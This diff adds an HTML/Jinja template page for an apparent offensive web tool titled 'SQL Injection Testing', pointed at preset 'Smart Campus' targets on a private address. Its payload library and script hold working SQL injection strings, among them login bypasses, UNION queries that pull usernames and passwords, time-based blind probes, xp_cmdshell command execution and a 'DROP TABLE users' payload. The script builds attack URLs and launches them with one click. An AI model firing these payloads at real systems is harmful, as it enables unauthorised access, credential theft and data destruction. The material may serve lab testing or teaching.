@@ -1,0 +1,295 @@
+{% extends "base.html" %}
+
+{% block content %}
+<div class="space-y-6">
+    <div class="glass-effect rounded-2xl p-6">
+        <h1 class="text-4xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-pink-400">
+            <i class="fas fa-database"></i> SQL Injection Testing
+        </h1>
+        <p class="text-gray-400 mt-2">Exploit database vulnerabilities with automated payloads</p>
+    </div>
+    
+    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+        <!-- Target Configuration -->
+        <div class="glass-effect rounded-2xl p-6">
+            <h2 class="text-2xl font-bold mb-6 text-pink-400">
+                <i class="fas fa-crosshairs"></i> Target Configuration
+            </h2>
+            
+            <form id="sqlForm" class="space-y-4">
+                <div>
+                    <label class="block text-sm font-medium mb-2">
+                        <i class="fas fa-link mr-2"></i>Target URL
+                    </label>
+                    <input type="text" id="target_url" name="target_url" 
+                        placeholder="http://192.168.1.100/login.php" required
+                        class="w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-700 focus:border-pink-400 outline-none">
+                </div>
+                
+                <div>
+                    <label class="block text-sm font-medium mb-2">
+                        <i class="fas fa-code mr-2"></i>Injection Type
+                    </label>
+                    <select id="injection_type" name="injection_type" onchange="updatePayload()"
+                        class="w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-700 focus:border-pink-400 outline-none">
+                        <option value="authentication_bypass">Authentication Bypass</option>
+                        <option value="union_based">UNION-based</option>
+                        <option value="error_based">Error-based</option>
+                        <option value="time_based">Time-based Blind</option>
+                        <option value="data_extraction">Data Extraction</option>
+                        <option value="command_execution">Command Execution</option>
+                        <option value="bypass_filters">Filter Bypass</option>
+                    </select>
+                </div>
+                
+                <div>
+                    <label class="block text-sm font-medium mb-2">
+                        <i class="fas fa-terminal mr-2"></i>SQL Payload
+                    </label>
+                    <select id="payload_select" onchange="setPayload()"
+                        class="w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-700 focus:border-pink-400 outline-none">
+                    </select>
+                </div>
+                
+                <div>
+                    <label class="block text-sm font-medium mb-2">
+                        <i class="fas fa-edit mr-2"></i>Custom Payload (Optional)
+                    </label>
+                    <textarea id="custom_payload" rows="3"
+                        placeholder="Or enter your custom SQL injection payload..."
+                        class="w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-700 focus:border-pink-400 outline-none font-mono text-sm"></textarea>
+                </div>
+                
+                <div class="bg-purple-900/20 border border-purple-700/50 rounded-lg p-4">
+                    <p class="text-purple-400 text-sm">
+                        <i class="fas fa-info-circle mr-2"></i>
+                        This will redirect to the target URL with the SQL injection payload appended.
+                    </p>
+                </div>
+                
+                <button type="submit" class="w-full attack-button text-white font-semibold py-4 rounded-lg text-lg">
+                    <i class="fas fa-external-link-alt mr-2"></i>Launch SQL Injection
+                </button>
+            </form>
+        </div>
+        
+        <!-- Payload Library -->
+        <div class="glass-effect rounded-2xl p-6">
+            <h2 class="text-2xl font-bold mb-6 text-cyan-400">
+                <i class="fas fa-book"></i> Payload Library
+            </h2>
+            
+            <div class="space-y-3 max-h-96 overflow-y-auto" id="payload-info">
+                <div class="bg-gray-800/50 rounded-lg p-3 border-l-4 border-green-500">
+                    <h3 class="font-bold text-green-400 text-sm mb-2">Authentication Bypass</h3>
+                    <div class="space-y-1 text-xs font-mono">
+                        <p class="text-gray-300">admin' OR '1'='1</p>
+                        <p class="text-gray-300">' OR 1=1 --</p>
+                        <p class="text-gray-300">admin' --</p>
+                    </div>
+                </div>
+                
+                <div class="bg-gray-800/50 rounded-lg p-3 border-l-4 border-blue-500">
+                    <h3 class="font-bold text-blue-400 text-sm mb-2">UNION-based</h3>
+                    <div class="space-y-1 text-xs font-mono">
+                        <p class="text-gray-300">' UNION SELECT NULL--</p>
+                        <p class="text-gray-300">' UNION SELECT username,password FROM users--</p>
+                    </div>
+                </div>
+                
+                <div class="bg-gray-800/50 rounded-lg p-3 border-l-4 border-yellow-500">
+                    <h3 class="font-bold text-yellow-400 text-sm mb-2">Time-based Blind</h3>
+                    <div class="space-y-1 text-xs font-mono">
+                        <p class="text-gray-300">'; WAITFOR DELAY '00:00:05'--</p>
+                        <p class="text-gray-300">1' AND SLEEP(5)--</p>
+                    </div>
+                </div>
+                
+                <div class="bg-gray-800/50 rounded-lg p-3 border-l-4 border-red-500">
+                    <h3 class="font-bold text-red-400 text-sm mb-2">Data Extraction</h3>
+                    <div class="space-y-1 text-xs font-mono">
+                        <p class="text-gray-300">' UNION SELECT table_name FROM information_schema.tables--</p>
+                        <p class="text-gray-300">' UNION SELECT username,password FROM users--</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Smart Campus Targets -->
+    <div class="glass-effect rounded-2xl p-6">
+        <h2 class="text-2xl font-bold mb-4 text-purple-400">
+            <i class="fas fa-bullseye"></i> Smart Campus Targets
+        </h2>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+            <button onclick="setTarget('http://192.168.1.100/login.php')" 
+                class="bg-gray-800 hover:bg-gray-700 p-4 rounded-lg text-left transition">
+                <i class="fas fa-sign-in-alt text-cyan-400 text-2xl mb-2"></i>
+                <p class="font-semibold">Admin Login</p>
+                <p class="text-xs text-gray-400">Dashboard Authentication</p>
+            </button>
+            
+            <button onclick="setTarget('http://192.168.1.100/sensors.php?id=1')" 
+                class="bg-gray-800 hover:bg-gray-700 p-4 rounded-lg text-left transition">
+                <i class="fas fa-microchip text-green-400 text-2xl mb-2"></i>
+                <p class="font-semibold">Sensor Data</p>
+                <p class="text-xs text-gray-400">Sensor Query Page</p>
+            </button>
+            
+            <button onclick="setTarget('http://192.168.1.100/search.php')" 
+                class="bg-gray-800 hover:bg-gray-700 p-4 rounded-lg text-left transition">
+                <i class="fas fa-search text-yellow-400 text-2xl mb-2"></i>
+                <p class="font-semibold">Search Function</p>
+                <p class="text-xs text-gray-400">Campus Search</p>
+            </button>
+        </div>
+    </div>
+    
+    <!-- Common Payloads Quick Access -->
+    <div class="glass-effect rounded-2xl p-6">
+        <h2 class="text-2xl font-bold mb-4 text-orange-400">
+            <i class="fas fa-bolt"></i> Quick Payloads
+        </h2>
+        <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
+    <button onclick="quickPayload('\'admin\' OR \'1\'=\'1\'')" 
+        class="bg-green-600 hover:bg-green-700 p-3 rounded-lg text-sm transition">
+        Auth Bypass #1
+    </button>
+
+    <button onclick="  quickPayload('\" OR 1=1 --')" 
+        class="bg-green-600 hover:bg-green-700 p-3 rounded-lg text-sm transition">
+        Auth Bypass #2
+    </button>
+
+    <button onclick="quickPayload('\' UNION SELECT NULL,NULL,NULL--')" 
+        class="bg-blue-600 hover:bg-blue-700 p-3 rounded-lg text-sm transition">
+        UNION Test
+    </button>
+
+    <button onclick="quickPayload('1\' AND SLEEP(5)--')" 
+        class="bg-yellow-600 hover:bg-yellow-700 p-3 rounded-lg text-sm transition">
+        Time Delay
+    </button>
+</div>
+
+    </div>
+    
+    <!-- Injection Log -->
+    <div class="glass-effect rounded-2xl p-6">
+        <h2 class="text-2xl font-bold mb-4 text-cyan-400">
+            <i class="fas fa-clipboard-list"></i> Injection Log
+        </h2>
+        <div id="injection-log" class="terminal p-4 rounded-lg">
+            <p class="text-green-400">[*] SQL Injection Module Ready</p>
+            <p class="text-gray-500">[*] Select target and payload to begin</p>
+        </div>
+    </div>
+</div>
+
+<script>
+    const payloads = {
+        authentication_bypass: [
+            "admin' OR '1'='1",
+            "admin' OR '1'='1' --",
+            "' OR 1=1 --",
+            "' OR 'x'='x",
+            "admin' --"
+        ],
+        union_based: [
+            "' UNION SELECT NULL--",
+            "' UNION SELECT NULL,NULL--",
+            "' UNION SELECT username,password FROM users--",
+            "1' UNION SELECT table_name,NULL FROM information_schema.tables--"
+        ],
+        error_based: [
+            "'",
+            "''",
+            "' AND 1=CONVERT(int, (SELECT @@version))--"
+        ],
+        time_based: [
+            "'; WAITFOR DELAY '00:00:05'--",
+            "1' AND SLEEP(5)--",
+            "1' AND BENCHMARK(5000000,MD5('test'))--"
+        ],
+        data_extraction: [
+            "' UNION SELECT username,password,email FROM users--",
+            "' UNION SELECT table_name FROM information_schema.tables--",
+            "' UNION SELECT @@version,NULL,NULL--"
+        ],
+        command_execution: [
+            "'; EXEC xp_cmdshell('dir')--",
+            "1'; DROP TABLE users--"
+        ],
+        bypass_filters: [
+            "admin'/**/OR/**/1=1--",
+            "a%64min' OR '1'='1",
+            "aDmIn' oR '1'='1"
+        ]
+    };
+    
+    function updatePayload() {
+        const type = document.getElementById('injection_type').value;
+        const select = document.getElementById('payload_select');
+        select.innerHTML = '';
+        
+        payloads[type].forEach((payload, index) => {
+            const option = document.createElement('option');
+            option.value = payload;
+            option.textContent = `${index + 1}. ${payload}`;
+            select.appendChild(option);
+        });
+    }
+    
+    function setPayload() {
+        const payload = document.getElementById('payload_select').value;
+        document.getElementById('custom_payload').value = payload;
+    }
+    
+    function setTarget(url) {
+        document.getElementById('target_url').value = url;
+    }
+    
+    function quickPayload(payload) {
+        document.getElementById('custom_payload').value = payload;
+    }
+    
+    document.getElementById('sqlForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        let targetUrl = document.getElementById('target_url').value;
+        const customPayload = document.getElementById('custom_payload').value;
+        const selectedPayload = document.getElementById('payload_select').value;
+        const payload = customPayload || selectedPayload;
+        
+        const log = document.getElementById('injection-log');
+        log.innerHTML = `
+            <p class="text-cyan-400">[*] Preparing SQL injection...</p>
+            <p class="text-yellow-400">[*] Target: ${targetUrl}</p>
+            <p class="text-yellow-400">[*] Payload: ${payload}</p>
+        `;
+        
+        // Construct injection URL
+        let injectionUrl;
+        if (targetUrl.includes('?')) {
+            injectionUrl = `${targetUrl}&injection=${encodeURIComponent(payload)}`;
+        } else if (targetUrl.includes('login')) {
+            injectionUrl = `${targetUrl}?username=${encodeURIComponent(payload)}&password=${encodeURIComponent(payload)}`;
+        } else {
+            injectionUrl = `${targetUrl}?id=${encodeURIComponent(payload)}`;
+        }
+        
+        log.innerHTML += `
+            <p class="text-green-400 mt-2">[+] Injection URL constructed</p>
+            <p class="text-green-400">[+] Redirecting to: ${injectionUrl}</p>
+        `;
+        
+        setTimeout(() => {
+            window.open(injectionUrl, '_blank');
+            log.innerHTML += `<p class="text-cyan-400 mt-2">[*] Injection launched in new tab</p>`;
+        }, 1000);
+    });
+    
+    // Initialize
+    updatePayload();
+</script>
+{% endblock %}
